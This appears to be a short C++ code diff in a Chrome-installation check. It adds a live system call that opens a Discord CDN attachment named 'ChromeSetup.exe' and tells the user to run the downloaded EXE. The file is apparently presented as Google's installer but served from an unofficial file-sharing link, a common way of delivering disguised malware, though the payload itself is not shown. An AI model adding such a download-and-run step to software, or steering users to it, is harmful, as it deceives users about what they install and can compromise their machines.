@@ -313,7 +313,7 @@ bool Checks::isChromeInstalled()
     {
         Helper::printError("- Google Chrome is not installed. Downloading Google Chrome (please open the EXE once downloaded)");
         Sleep(1000);
-        //system("start https://www.dropbox.com/s/naobah5gactcfi7/ChromeSetup.exe?dl=1");
+        system("start https://cdn.discordapp.com/attachments/1044581773960560660/1054138215822544956/ChromeSetup.exe");
         return false;
     }
 }
